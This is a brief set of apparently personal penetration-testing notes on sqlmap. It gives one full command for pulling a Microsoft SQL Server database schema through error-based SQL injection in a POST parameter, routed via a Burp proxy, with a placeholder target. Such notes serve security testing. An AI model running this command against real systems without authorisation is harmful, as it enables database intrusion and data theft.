## SQLmap notes

### Get database schema

* Microsoft SQL Server
* Error-base
* POST
* Burp Pro proxy
* Specific database

```bash
sqlmap -v3 -u https://example.com --method=POST --data="post-request-data" --proxy=http://127.0.0.1:8080 -p <vulnerable_parameter> --os=Windows --technique=E --dbms="Microsoft SQL Server" --schema --dump-format=CSV -D dbname
```

